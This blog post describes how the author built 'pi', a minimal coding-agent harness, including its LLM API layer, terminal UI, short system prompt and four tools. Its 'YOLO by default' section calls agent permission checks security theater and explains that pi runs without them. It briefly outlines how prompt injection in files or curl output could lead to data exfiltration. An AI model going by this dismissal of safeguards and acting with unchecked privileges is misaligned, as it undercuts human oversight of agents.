    &lt;head rend="h1"&gt;What I learned building an opinionated and minimal coding agent&lt;/head&gt;
    &lt;p&gt;2025-11-30&lt;/p&gt;
    &lt;head rend="h1"&gt;Table of contents&lt;/head&gt;
    &lt;p&gt;In the past three years, I've been using LLMs for assisted coding. If you read this, you probably went through the same evolution: from copying and pasting code into ChatGPT, to Copilot auto-completions (which never worked for me), to Cursor, and finally the new breed of coding agent harnesses like Claude Code, Codex, Amp, Droid, and opencode that became our daily drivers in 2025.&lt;/p&gt;
    &lt;p&gt;I preferred Claude Code for most of my work. It was the first thing I tried back in April after using Cursor for a year and a half. Back then, it was much more basic. That fit my workflow perfectly, because I'm a simple boy who likes simple, predictable tools. Over the past few months, Claude Code has turned into a spaceship with 80% of functionality I have no use for. The system prompt and tools also change on every release, which breaks my workflows and changes model behavior. I hate that. Also, it flickers.&lt;/p&gt;
    &lt;p&gt;I've also built a bunch of agents over the years, of various complexity. For example, Sitegeist, my little browser-use agent, is essentially a coding agent that lives inside the browser. In all that work, I learned that context engineering is paramount. Exactly controlling what goes into the model's context yields better outputs, especially when it's writing code. Existing harnesses make this extremely hard or impossible by injecting stuff behind your back that isn't even surfaced in the UI.&lt;/p&gt;
    &lt;p&gt;Speaking of surfacing things, I want to inspect every aspect of my interactions with the model. Basically no harness allows that. I also want a cleanly documented session format I can post-process automatically, and a simple way to build alternative UIs on top of the agent core. While some of this is possible with existing harnesses, the APIs smell like organic evolution. These solutions accumulated baggage along the way, which shows in the developer experience. I'm not blaming anyone for this. If tons of people use your shit and you need some sort of backwards compatibility, that's the price you pay.&lt;/p&gt;
    &lt;p&gt;I've also dabbled in self-hosting, both locally and on DataCrunch. While some harnesses like opencode support self-hosted models, it usually doesn't work well. Mostly because they rely on libraries like the Vercel AI SDK, which doesn't play nice with self-hosted models for some reason, specifically when it comes to tool calling.&lt;/p&gt;
    &lt;p&gt;So what's an old guy yelling at Claudes going to do? He's going to write his own coding agent harness and give it a name that's entirely un-Google-able, so there will never be any users. Which means there will also never be any issues on the GitHub issue tracker. How hard can it be?&lt;/p&gt;
    &lt;p&gt;To make this work, I needed to build:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;pi-ai: A unified LLM API with multi-provider support (Anthropic, OpenAI, Google, xAI, Groq, Cerebras, OpenRouter, and any OpenAI-compatible endpoint), streaming, tool calling with TypeBox schemas, thinking/reasoning support, seamless cross-provider context handoffs, and token and cost tracking.&lt;/item&gt;
      &lt;item&gt;pi-agent-core: An agent loop that handles tool execution, validation, and event streaming.&lt;/item&gt;
      &lt;item&gt;pi-tui: A minimal terminal UI framework with differential rendering, synchronized output for (almost) flicker-free updates, and components like editors with autocomplete and markdown rendering.&lt;/item&gt;
      &lt;item&gt;pi-coding-agent: The actual CLI that wires it all together with session management, custom tools, themes, and project context files.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;My philosophy in all of this was: if I don't need it, it won't be built. And I don't need a lot of things.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-ai and pi-agent-core&lt;/head&gt;
    &lt;p&gt;I'm not going to bore you with the API specifics of this package. You can read it all in the README.md. Instead, I want to document the problems I ran into while creating a unified LLM API and how I resolved them. I'm not claiming my solutions are the best, but they've been working pretty well throughout various agentic and non-agentic LLM projects.&lt;/p&gt;
    &lt;head rend="h3"&gt;There. Are. Four. Ligh... APIs&lt;/head&gt;
    &lt;p&gt;There's really only four APIs you need to speak to talk to pretty much any LLM provider: OpenAI's Completions API, their newer Responses API, Anthropic's Messages API, and Google's Generative AI API.&lt;/p&gt;
    &lt;p&gt;They're all pretty similar in features, so building an abstraction on top of them isn't rocket science. There are, of course, provider-specific peculiarities you have to care for. That's especially true for the Completions API, which is spoken by pretty much all providers, but each of them has a different understanding of what this API should do. For example, while OpenAI doesn't support reasoning traces in their Completions API, other providers do in their version of the Completions API. This is also true for inference engines like llama.cpp, Ollama, vLLM, and LM Studio.&lt;/p&gt;
    &lt;p&gt;For example, in openai-completions.ts:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Cerebras, xAI, Mistral, and Chutes don't like the &lt;code&gt;store&lt;/code&gt;field&lt;/item&gt;
      &lt;item&gt;Mistral and Chutes use &lt;code&gt;max_tokens&lt;/code&gt;instead of&lt;code&gt;max_completion_tokens&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Cerebras, xAI, Mistral, and Chutes don't support the &lt;code&gt;developer&lt;/code&gt;role for system prompts&lt;/item&gt;
      &lt;item&gt;Grok models don't like &lt;code&gt;reasoning_effort&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Different providers return reasoning content in different fields (&lt;code&gt;reasoning_content&lt;/code&gt;vs&lt;code&gt;reasoning&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To ensure all features actually work across the gazillion of providers, pi-ai has a pretty extensive test suite covering image inputs, reasoning traces, tool calling, and other features you'd expect from an LLM API. Tests run across all supported providers and popular models. While this is a good effort, it still won't guarantee that new models and providers will just work out of the box.&lt;/p&gt;
    &lt;p&gt;Another big difference is how providers report tokens and cache reads/writes. Anthropic has the sanest approach, but generally it's the Wild West. Some report token counts at the start of the SSE stream, others only at the end, making accurate cost tracking impossible if a request is aborted. To add insult to injury, you can't provide a unique ID to later correlate with their billing APIs and figure out which of your users consumed how many tokens. So pi-ai does token and cache tracking on a best-effort basis. Good enough for personal use, but not for accurate billing if you have end users consuming tokens through your service.&lt;/p&gt;
    &lt;p&gt;Special shout out to Google who to this date seem to not support tool call streaming which is extremely Google.&lt;/p&gt;
    &lt;p&gt;pi-ai also works in the browser, which is useful for building web-based interfaces. Some providers make this especially easy by supporting CORS, specifically Anthropic and xAI.&lt;/p&gt;
    &lt;head rend="h3"&gt;Context handoff&lt;/head&gt;
    &lt;p&gt;Context handoff between providers was a feature pi-ai was designed for from the start. Since each provider has their own way of tracking tool calls and thinking traces, this can only be a best-effort thing. For example, if you switch from Anthropic to OpenAI mid-session, Anthropic thinking traces are converted to content blocks inside assistant messages, delimited by &lt;code&gt;&amp;lt;thinking&amp;gt;&amp;lt;/thinking&amp;gt;&lt;/code&gt; tags. This may or may not be sensible, because the thinking traces returned by Anthropic and OpenAI don't actually represent what's happening behind the scenes.&lt;/p&gt;
    &lt;p&gt;These providers also insert signed blobs into the event stream that you have to replay on subsequent requests containing the same messages. This also applies when switching models within a provider. It makes for a cumbersome abstraction and transformation pipeline in the background.&lt;/p&gt;
    &lt;p&gt;I'm happy to report that cross-provider context handoff and context serialization/deserialization work pretty well in pi-ai:&lt;/p&gt;
    &lt;code&gt;import { getModel, complete, Context } from '@mariozechner/pi-ai';

// Start with Claude
const claude = getModel('anthropic', 'claude-sonnet-4-5');
const context: Context = {
  messages: []
};

context.messages.push({ role: 'user', content: 'What is 25 * 18?' });
const claudeResponse = await complete(claude, context, {
  thinkingEnabled: true
});
context.messages.push(claudeResponse);

// Switch to GPT - it will see Claude's thinking as &amp;lt;thinking&amp;gt; tagged text
const gpt = getModel('openai', 'gpt-5.1-codex');
context.messages.push({ role: 'user', content: 'Is that correct?' });
const gptResponse = await complete(gpt, context);
context.messages.push(gptResponse);

// Switch to Gemini
const gemini = getModel('google', 'gemini-2.5-flash');
context.messages.push({ role: 'user', content: 'What was the question?' });
const geminiResponse = await complete(gemini, context);

// Serialize context to JSON (for storage, transfer, etc.)
const serialized = JSON.stringify(context);

// Later: deserialize and continue with any model
const restored: Context = JSON.parse(serialized);
restored.messages.push({ role: 'user', content: 'Summarize our conversation' });
const continuation = await complete(claude, restored);
&lt;/code&gt;
    &lt;head rend="h3"&gt;We live in a multi-model world&lt;/head&gt;
    &lt;p&gt;Speaking of models, I wanted a typesafe way of specifying them in the &lt;code&gt;getModel&lt;/code&gt; call. For that I needed a model registry that I could turn into TypeScript types. I'm parsing data from both OpenRouter and models.dev (created by the opencode folks, thanks for that, it's super useful) into models.generated.ts. This includes token costs and capabilities like image inputs and thinking support.&lt;/p&gt;
    &lt;p&gt;And if I ever need to add a model that's not in the registry, I wanted a type system that makes it easy to create new ones. This is especially useful when working with self-hosted models, new releases that aren't yet on models.dev or OpenRouter, or trying out one of the more obscure LLM providers:&lt;/p&gt;
    &lt;code&gt;import { Model, stream } from '@mariozechner/pi-ai';

const ollamaModel: Model&amp;lt;'openai-completions'&amp;gt; = {
  id: 'llama-3.1-8b',
  name: 'Llama 3.1 8B (Ollama)',
  api: 'openai-completions',
  provider: 'ollama',
  baseUrl: 'http://localhost:11434/v1',
  reasoning: false,
  input: ['text'],
  cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 },
  contextWindow: 128000,
  maxTokens: 32000
};

const response = await stream(ollamaModel, context, {
  apiKey: 'dummy' // Ollama doesn't need a real key
});
&lt;/code&gt;
    &lt;p&gt;Many unified LLM APIs completely ignore providing a way to abort requests. This is entirely unacceptable if you want to integrate your LLM into any kind of production system. Many unified LLM APIs also don't return partial results to you, which is kind of ridiculous. pi-ai was designed from the beginning to support aborts throughout the entire pipeline, including tool calls. Here's how it works:&lt;/p&gt;
    &lt;code&gt;import { getModel, stream } from '@mariozechner/pi-ai';

const model = getModel('openai', 'gpt-5.1-codex');
const controller = new AbortController();

// Abort after 2 seconds
setTimeout(() =&amp;gt; controller.abort(), 2000);

const s = stream(model, {
  messages: [{ role: 'user', content: 'Write a long story' }]
}, {
  signal: controller.signal
});

for await (const event of s) {
  if (event.type === 'text_delta') {
    process.stdout.write(event.delta);
  } else if (event.type === 'error') {
    console.log(`${event.reason === 'aborted' ? 'Aborted' : 'Error'}:`, event.error.errorMessage);
  }
}

// Get results (may be partial if aborted)
const response = await s.result();
if (response.stopReason === 'aborted') {
  console.log('Partial content:', response.content);
}
&lt;/code&gt;
    &lt;head rend="h3"&gt;Structured split tool results&lt;/head&gt;
    &lt;p&gt;Another abstraction I haven't seen in any unified LLM API is splitting tool results into a portion handed to the LLM and a portion for UI display. The LLM portion is generally just text or JSON, which doesn't necessarily contain all the information you'd want to show in a UI. It also sucks hard to parse textual tool outputs and restructure them for display in a UI. pi-ai's tool implementation allows returning both content blocks for the LLM and separate content blocks for UI rendering. Tools can also return attachments like images that get attached in the native format of the respective provider. Tool arguments are automatically validated using TypeBox schemas and AJV, with detailed error messages when validation fails:&lt;/p&gt;
    &lt;code&gt;import { Type, AgentTool } from '@mariozechner/pi-ai';

const weatherSchema = Type.Object({
  city: Type.String({ minLength: 1 }),
});

const weatherTool: AgentTool&amp;lt;typeof weatherSchema, { temp: number }&amp;gt; = {
  name: 'get_weather',
  description: 'Get current weather for a city',
  parameters: weatherSchema,
  execute: async (toolCallId, args) =&amp;gt; {
    const temp = Math.round(Math.random() * 30);
    return {
      // Text for the LLM
      output: `Temperature in ${args.city}: ${temp}Â°C`,
      // Structured data for the UI
      details: { temp }
    };
  }
};

// Tools can also return images
const chartTool: AgentTool = {
  name: 'generate_chart',
  description: 'Generate a chart from data',
  parameters: Type.Object({ data: Type.Array(Type.Number()) }),
  execute: async (toolCallId, args) =&amp;gt; {
    const chartImage = await generateChartImage(args.data);
    return {
      content: [
        { type: 'text', text: `Generated chart with ${args.data.length} data points` },
        { type: 'image', data: chartImage.toString('base64'), mimeType: 'image/png' }
      ]
    };
  }
};
&lt;/code&gt;
    &lt;p&gt;What's still lacking is tool result streaming. Imagine a bash tool where you want to display ANSI sequences as they come in. That's currently not possible, but it's a simple fix that will eventually make it into the package.&lt;/p&gt;
    &lt;p&gt;Partial JSON parsing during tool call streaming is essential for good UX. As the LLM streams tool call arguments, pi-ai progressively parses them so you can show partial results in the UI before the call completes. For example, you can display a diff streaming in as the agent rewrites a file.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal agent scaffold&lt;/head&gt;
    &lt;p&gt;Finally, pi-ai provides an agent loop that handles the full orchestration: processing user messages, executing tool calls, feeding results back to the LLM, and repeating until the model produces a response without tool calls. The loop also supports message queuing via a callback: after each turn, it asks for queued messages and injects them before the next assistant response. The loop emits events for everything, making it easy to build reactive UIs.&lt;/p&gt;
    &lt;p&gt;The agent loop doesn't let you specify max steps or similar knobs you'd find in other unified LLM APIs. I never found a use case for that, so why add it? The loop just loops until the agent says it's done. On top of the loop, however, pi-agent-core provides an &lt;code&gt;Agent&lt;/code&gt; class with actually useful stuff: state management, simplified event subscriptions, message queuing with two modes (one-at-a-time or all-at-once), attachment handling (images, documents), and a transport abstraction that lets you run the agent either directly or through a proxy.&lt;/p&gt;
    &lt;p&gt;Am I happy with pi-ai? For the most part, yes. Like any unifying API, it can never be perfect due to leaky abstractions. But it's been used in seven different production projects and has served me extremely well.&lt;/p&gt;
    &lt;p&gt;Why build this instead of using the Vercel AI SDK? Armin's blog post mirrors my experience. Building on top of the provider SDKs directly gives me full control and lets me design the APIs exactly as I want, with a much smaller surface area. Armin's blog gives you a more in-depth treatise on the reasons for building your own. Go read that.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-tui&lt;/head&gt;
    &lt;p&gt;I grew up in the DOS era, so terminal user interfaces are what I grew up with. From the fancy setup programs for Doom to Borland products, TUIs were with me until the end of the 90s. And boy was I fucking happy when I eventually switched to a GUI operating system. While TUIs are mostly portable and easily streamable, they also suck at information density. Having said all that, I thought starting with a terminal user interface for pi makes the most sense. I could strap on a GUI later whenever I felt like I needed to.&lt;/p&gt;
    &lt;p&gt;So why build my own TUI framework? I've looked into the alternatives like Ink, Blessed, OpenTUI, and so on. I'm sure they're all fine in their own way, but I definitely don't want to write my TUI like a React app. Blessed seems to be mostly unmaintained, and OpenTUI is explicitly not production ready. Also, writing my own TUI framework on top of Node.js seemed like a fun little challenge.&lt;/p&gt;
    &lt;head rend="h3"&gt;Two kinds of TUIs&lt;/head&gt;
    &lt;p&gt;Writing a terminal user interface is not rocket science per se. You just have to pick your poison. There's basically two ways to do it. One is to take ownership of the terminal viewport (the portion of the terminal contents you can actually see) and treat it like a pixel buffer. Instead of pixels you have cells that contain characters with background color, foreground color, and styling like italic and bold. I call these full screen TUIs. Amp and opencode use this approach.&lt;/p&gt;
    &lt;p&gt;The drawback is that you lose the scrollback buffer, which means you have to implement custom search. You also lose scrolling, which means you have to simulate scrolling within the viewport yourself. While this is not hard to implement, it means you have to re-implement all the functionality your terminal emulator already provides. Mouse scrolling specifically always feels kind of off in such TUIs.&lt;/p&gt;
    &lt;p&gt;The second approach is to just write to the terminal like any CLI program, appending content to the scrollback buffer, only occasionally moving the "rendering cursor" back up a little within the visible viewport to redraw things like animated spinners or a text edit field. It's not exactly that simple, but you get the idea. This is what Claude Code, Codex, and Droid do.&lt;/p&gt;
    &lt;p&gt;Coding agents have this nice property that they're basically a chat interface. The user writes a prompt, followed by replies from the agent and tool calls and their results. Everything is nicely linear, which lends itself well to working with the "native" terminal emulator. You get to use all the built-in functionality like natural scrolling and search within the scrollback buffer. It also limits what your TUI can do to some degree, which I find charming because constraints make for minimal programs that just do what they're supposed to do without superfluous fluff. This is the direction I picked for pi-tui.&lt;/p&gt;
    &lt;head rend="h3"&gt;Retained mode UI&lt;/head&gt;
    &lt;p&gt;If you've done any GUI programming, you've probably heard of retained mode vs immediate mode. In a retained mode UI, you build up a tree of components that persist across frames. Each component knows how to render itself and can cache its output if nothing changed. In an immediate mode UI, you redraw everything from scratch each frame (though in practice, immediate mode UIs also do caching, otherwise they'd fall apart).&lt;/p&gt;
    &lt;p&gt;pi-tui uses a simple retained mode approach. A &lt;code&gt;Component&lt;/code&gt; is just an object with a &lt;code&gt;render(width)&lt;/code&gt; method that returns an array of strings (lines that fit the viewport horizontally, with ANSI escape codes for colors and styling) and an optional &lt;code&gt;handleInput(data)&lt;/code&gt; method for keyboard input. A &lt;code&gt;Container&lt;/code&gt; holds a list of components arranged vertically and collects all their rendered lines. The &lt;code&gt;TUI&lt;/code&gt; class is itself a container that orchestrates everything.&lt;/p&gt;
    &lt;p&gt;When the TUI needs to update the screen, it asks each component to render. Components can cache their output: an assistant message that's fully streamed doesn't need to re-parse markdown and re-render ANSI sequences every time. It just returns the cached lines. Containers collect lines from all children. The TUI gathers all these lines and compares them to the lines it previously rendered for the previous component tree. It keeps a backbuffer of sorts, remembering what was written to the scrollback buffer.&lt;/p&gt;
    &lt;p&gt;Then it only redraws what changed, using a method I call differential rendering. I'm very bad with names, and this likely has an official name.&lt;/p&gt;
    &lt;head rend="h3"&gt;Differential rendering&lt;/head&gt;
    &lt;p&gt;Here's a simplified demo that illustrates what exactly gets redrawn.&lt;/p&gt;
    &lt;p&gt;The algorithm is simple:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;First render: Just output all lines to the terminal&lt;/item&gt;
      &lt;item&gt;Width changed: Clear screen completely and re-render everything (soft wrapping changes)&lt;/item&gt;
      &lt;item&gt;Normal update: Find the first line that differs from what's on screen, move the cursor to that line, and re-render from there to the end&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There's one catch: if the first changed line is above the visible viewport (the user scrolled up), we have to do a full clear and re-render. The terminal doesn't let you write to the scrollback buffer above the viewport.&lt;/p&gt;
    &lt;p&gt;To prevent flicker during updates, pi-tui wraps all rendering in synchronized output escape sequences (&lt;code&gt;CSI ?2026h&lt;/code&gt; and &lt;code&gt;CSI ?2026l&lt;/code&gt;). This tells the terminal to buffer all the output and display it atomically. Most modern terminals support this.&lt;/p&gt;
    &lt;p&gt;How well does it work and how much does it flicker? In any capable terminal like Ghostty or iTerm2, this works brilliantly and you never see any flicker. In less fortunate terminal implementations like VS Code's built-in terminal, you will get some flicker depending on the time of day, your display size, your window size, and so on. Given that I'm very accustomed to Claude Code, I haven't spent any more time optimizing this. I'm happy with the little flicker I get in VS Code. I wouldn't feel at home otherwise. And it still flickers less than Claude Code.&lt;/p&gt;
    &lt;p&gt;How wasteful is this approach? We store an entire scrollback buffer worth of previously rendered lines, and we re-render lines every time the TUI is asked to render itself. That's alleviated with the caching I described above, so the re-rendering isn't a big deal. We still have to compare a lot of lines with each other. Realistically, on computers younger than 25 years, this is not a big deal, both in terms of performance and memory use (a few hundred kilobytes for very large sessions). Thanks V8. What I get in return is a dead simple programming model that lets me iterate quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;pi-coding-agent&lt;/head&gt;
    &lt;p&gt;I don't need to explain what features you should expect from a coding agent harness. pi comes with most creature comforts you're used to from other tools:&lt;/p&gt;

        &lt;p&gt;HTML export of sessions&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Headless operation via JSON streaming and RPC mode&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Full cost and token tracking&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If you want the full rundown, read the README. What's more interesting is where pi deviates from other harnesses in philosophy and implementation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal system prompt&lt;/head&gt;
    &lt;p&gt;Here's the system prompt:&lt;/p&gt;
    &lt;code&gt;You are an expert coding assistant. You help users with coding tasks by reading files, executing commands, editing code, and writing new files.

Available tools:
- read: Read file contents
- bash: Execute bash commands
- edit: Make surgical edits to files
- write: Create or overwrite files

Guidelines:
- Use bash for file operations like ls, grep, find
- Use read to examine files before editing
- Use edit for precise changes (old text must match exactly)
- Use write only for new files or complete rewrites
- When summarizing your actions, output plain text directly - do NOT use cat or bash to display what you did
- Be concise in your responses
- Show file paths clearly when working with files

Documentation:
- Your own documentation (including custom model setup and theme creation) is at: /path/to/README.md
- Read it when users ask about features, configuration, or setup, and especially if the user asks you to add a custom model or provider, or create a custom theme.
&lt;/code&gt;
    &lt;p&gt;That's it. The only thing that gets injected at the bottom is your AGENTS.md file. Both the global one that applies to all your sessions and the project-specific one stored in your project directory. This is where you can customize pi to your liking. You can even replace the full system prompt if you want to. Compared to, for example, Claude Code's system prompt, Codex's system prompt, or opencode's model-specific prompts (the Claude one is a cut-down version of the original Claude Code prompt they copied).&lt;/p&gt;
    &lt;p&gt;You might think this is crazy. In all likelihood, the models have some training on their native coding harness. So using the native system prompt or something close to it like opencode would be most ideal. But it turns out that all the frontier models have been RL-trained up the wazoo, so they inherently understand what a coding agent is. There does not appear to be a need for 10,000 tokens of system prompt, as we'll find out later in the benchmark section, and as I've anecdotally found out by exclusively using pi for the past few weeks. Amp, while copying some parts of the native system prompts, seems to also do just fine with their own prompt.&lt;/p&gt;
    &lt;head rend="h3"&gt;Minimal toolset&lt;/head&gt;
    &lt;p&gt;Here are the tool definitions:&lt;/p&gt;
    &lt;code&gt;read
  Read the contents of a file. Supports text files and images (jpg, png,
  gif, webp). Images are sent as attachments. For text files, defaults to
  first 2000 lines. Use offset/limit for large files.
  - path: Path to the file to read (relative or absolute)
  - offset: Line number to start reading from (1-indexed)
  - limit: Maximum number of lines to read

write
  Write content to a file. Creates the file if it doesn't exist, overwrites
  if it does. Automatically creates parent directories.
  - path: Path to the file to write (relative or absolute)
  - content: Content to write to the file

edit
  Edit a file by replacing exact text. The oldText must match exactly
  (including whitespace). Use this for precise, surgical edits.
  - path: Path to the file to edit (relative or absolute)
  - oldText: Exact text to find and replace (must match exactly)
  - newText: New text to replace the old text with

bash
  Execute a bash command in the current working directory. Returns stdout
  and stderr. Optionally provide a timeout in seconds.
  - command: Bash command to execute
  - timeout: Timeout in seconds (optional, no default timeout)
&lt;/code&gt;
    &lt;p&gt;There are additional read-only tools (grep, find, ls) if you want to restrict the agent from modifying files or running arbitrary commands. By default these are disabled, so the agent only gets the four tools above.&lt;/p&gt;
    &lt;p&gt;As it turns out, these four tools are all you need for an effective coding agent. Models know how to use bash and have been trained on the read, write, and edit tools with similar input schemas. Compare this to Claude Code's tool definitions or opencode's tool definitions (which are clearly derived from Claude Code's, same structure, same examples, same git commit flow). Notably, Codex's tool definitions are similarly minimal to pi's.&lt;/p&gt;
    &lt;p&gt;pi's system prompt and tool definitions together come in below 1000 tokens.&lt;/p&gt;
    &lt;head rend="h3"&gt;YOLO by default&lt;/head&gt;
    &lt;p&gt;pi runs in full YOLO mode and assumes you know what you're doing. It has unrestricted access to your filesystem and can execute any command without permission checks or safety rails. No permission prompts for file operations or commands. No pre-checking of bash commands by Haiku for malicious content. Full filesystem access. Can execute any command with your user privileges.&lt;/p&gt;
    &lt;p&gt;If you look at the security measures in other coding agents, they're mostly security theater. As soon as your agent can write code and run code, it's pretty much game over. The only way you could prevent exfiltration of data would be to cut off all network access for the execution environment the agent runs in, which makes the agent mostly useless. An alternative is allow-listing domains, but this can also be worked around through other means.&lt;/p&gt;
    &lt;p&gt;Simon Willison has written extensively about this problem. His "dual LLM" pattern attempts to address confused deputy attacks and data exfiltration, but even he admits "this solution is pretty bad" and introduces enormous implementation complexity. The core issue remains: if an LLM has access to tools that can read private data and make network requests, you're playing whack-a-mole with attack vectors.&lt;/p&gt;
    &lt;p&gt;Since we cannot solve this trifecta of capabilities (read data, execute code, network access), pi just gives in. Everybody is running in YOLO mode anyways to get any productive work done, so why not make it the default and only option?&lt;/p&gt;
    &lt;p&gt;By default, pi has no web search or fetch tool. However, it can use &lt;code&gt;curl&lt;/code&gt; or read files from disk, both of which provide ample surface area for prompt injection attacks. Malicious content in files or command outputs can influence behavior. If you're uncomfortable with full access, run pi inside a container or use a different tool if you need (faux) guardrails.&lt;/p&gt;
    &lt;head rend="h3"&gt;No built-in to-dos&lt;/head&gt;
    &lt;p&gt;pi does not and will not support built-in to-dos. In my experience, to-do lists generally confuse models more than they help. They add state that the model has to track and update, which introduces more opportunities for things to go wrong.&lt;/p&gt;
    &lt;p&gt;If you need task tracking, make it externally stateful by writing to a file:&lt;/p&gt;
    &lt;code&gt;# TODO.md

- [x] Implement user authentication
- [x] Add database migrations
- [ ] Write API documentation
- [ ] Add rate limiting
&lt;/code&gt;
    &lt;p&gt;The agent can read and update this file as needed. Using checkboxes keeps track of what's done and what remains. Simple, visible, and under your control.&lt;/p&gt;
    &lt;head rend="h3"&gt;No plan mode&lt;/head&gt;
    &lt;p&gt;pi does not and will not have a built-in plan mode. Telling the agent to think through a problem together with you, without modifying files or executing commands, is generally sufficient.&lt;/p&gt;
    &lt;p&gt;If you need persistent planning across sessions, write it to a file:&lt;/p&gt;
    &lt;code&gt;# PLAN.md

## Goal
Refactor authentication system to support OAuth

## Approach
1. Research OAuth 2.0 flows
2. Design token storage schema
3. Implement authorization server endpoints
4. Update client-side login flow
5. Add tests

## Current Step
Working on step 3 - authorization endpoints
&lt;/code&gt;
    &lt;p&gt;The agent can read, update, and reference the plan as it works. Unlike ephemeral planning modes that only exist within a session, file-based plans can be shared across sessions, and can be versioned with your code.&lt;/p&gt;
    &lt;p&gt;Funnily enough, Claude Code now has a Plan Mode that's essentially read-only analysis, and it will eventually write a markdown file to disk. And you can basically not use plan mode without approving a shit ton of command invocations, because without that, planning is basically impossible.&lt;/p&gt;
    &lt;p&gt;The difference with pi is that I have full observability of everything. I get to see which sources the agent actually looked at and which ones it totally missed. In Claude Code, the orchestrating Claude instance usually spawns a sub-agent and you have zero visibility into what that sub-agent does. I get to see the markdown file immediately. I can edit it collaboratively with the agent. In short, I need observability for planning and I don't get that with Claude Code's plan mode.&lt;/p&gt;
    &lt;p&gt;If you must restrict the agent during planning, you can specify which tools it has access to via the CLI:&lt;/p&gt;
    &lt;code&gt;pi --tools read,grep,find,ls
&lt;/code&gt;
    &lt;p&gt;This gives you read-only mode for exploration and planning without the agent modifying anything or being able to run bash commands. You won't be happy with that though.&lt;/p&gt;
    &lt;head rend="h3"&gt;No MCP support&lt;/head&gt;
    &lt;p&gt;pi does not and will not support MCP. I've written about this extensively, but the TL;DR is: MCP servers are overkill for most use cases, and they come with significant context overhead.&lt;/p&gt;
    &lt;p&gt;Popular MCP servers like Playwright MCP (21 tools, 13.7k tokens) or Chrome DevTools MCP (26 tools, 18k tokens) dump their entire tool descriptions into your context on every session. That's 7-9% of your context window gone before you even start working. Many of these tools you'll never use in a given session.&lt;/p&gt;
    &lt;p&gt;The alternative is simple: build CLI tools with README files. The agent reads the README when it needs the tool, pays the token cost only when necessary (progressive disclosure), and can use bash to invoke the tool. This approach is composable (pipe outputs, chain commands), easy to extend (just add another script), and token-efficient.&lt;/p&gt;
    &lt;p&gt;Here's how I add web search to pi:&lt;/p&gt;
    &lt;p&gt;I maintain a collection of these tools at github.com/badlogic/agent-tools. Each tool is a simple CLI with a README that the agent reads on demand.&lt;/p&gt;
    &lt;p&gt;If you absolutely must use MCP servers, look into Peter Steinberger's mcporter tool that wraps MCP servers as CLI tools.&lt;/p&gt;
    &lt;head rend="h3"&gt;No background bash&lt;/head&gt;
    &lt;p&gt;pi's bash tool runs commands synchronously. There's no built-in way to start a dev server, run tests in the background, or interact with a REPL while the command is still running.&lt;/p&gt;
    &lt;p&gt;This is intentional. Background process management adds complexity: you need process tracking, output buffering, cleanup on exit, and ways to send input to running processes. Claude Code handles some of this with their background bash feature, but it has poor observability (a common theme with Claude Code) and forces the agent to track running instances without providing a tool to query them. In earlier Claude Code versions, the agent forgot about all its background processes after context compaction and had no way to query them, so you had to manually kill them. This has since been fixed.&lt;/p&gt;
    &lt;p&gt;Use tmux instead. Here's pi debugging a crashing C program in LLDB:&lt;/p&gt;
    &lt;p&gt;How's that for observability? The same approach works for long-running dev servers, watching log output, and similar use cases. And if you wanted to, you could hop into that LLDB session above via tmux and co-debug with the agent. Tmux also gives you a CLI argument to list all active sessions. How nice.&lt;/p&gt;
    &lt;p&gt;There's simply no need for background bash. Claude Code can use tmux too, you know. Bash is all you need.&lt;/p&gt;
    &lt;head rend="h3"&gt;No sub-agents&lt;/head&gt;
    &lt;p&gt;pi does not have a dedicated sub-agent tool. When Claude Code needs to do something complex, it often spawns a sub-agent to handle part of the task. You have zero visibility into what that sub-agent does. It's a black box within a black box. Context transfer between agents is also poor. The orchestrating agent decides what initial context to pass to the sub-agent, and you generally have little control over that. If the sub-agent makes a mistake, debugging is painful because you can't see the full conversation.&lt;/p&gt;
    &lt;p&gt;If you need pi to spawn itself, just ask it to run itself via bash. You could even have it spawn itself inside a tmux session for full observability and the ability to interact with that sub-agent directly.&lt;/p&gt;
    &lt;p&gt;But more importantly: fix your workflow, at least the ones that are all about context gathering. People use sub-agents within a session thinking they're saving context space, which is true. But that's the wrong way to think about sub-agents. Using a sub-agent mid-session for context gathering is a sign you didn't plan ahead. If you need to gather context, do that first in its own session. Create an artifact that you can later use in a fresh session to give your agent all the context it needs without polluting its context window with tool outputs. That artifact can be useful for the next feature too, and you get full observability and steerability, which is important during context gathering.&lt;/p&gt;
    &lt;p&gt;Because despite popular belief, models are still poor at finding all the context needed for implementing a new feature or fixing a bug. I attribute this to models being trained to only read parts of files rather than full files, so they're hesitant to read everything. Which means they miss important context and can't see what they need to properly complete the task.&lt;/p&gt;
    &lt;p&gt;Just look at the pi-mono issue tracker and the pull requests. Many get closed or revised because the agents couldn't fully grasp what's needed. That's not the fault of the contributors, which I truly appreciate because even incomplete PRs help me move faster. It just means we trust our agents too much.&lt;/p&gt;
    &lt;p&gt;I'm not dismissing sub-agents entirely. There are valid use cases. My most common one is code review: I tell pi to spawn itself with a code review prompt (via a custom slash command) and it gets the outputs.&lt;/p&gt;
    &lt;code&gt;---
description: Run a code review sub-agent
---
Spawn yourself as a sub-agent via bash to do a code review: $@

Use `pi --print` with appropriate arguments. If the user specifies a model,
use `--provider` and `--model` accordingly.

Pass a prompt to the sub-agent asking it to review the code for:
- Bugs and logic errors
- Security issues
- Error handling gaps

Do not read the code yourself. Let the sub-agent do that.

Report the sub-agent's findings.
&lt;/code&gt;
    &lt;p&gt;And here's how I use this to review a pull request on GitHub:&lt;/p&gt;
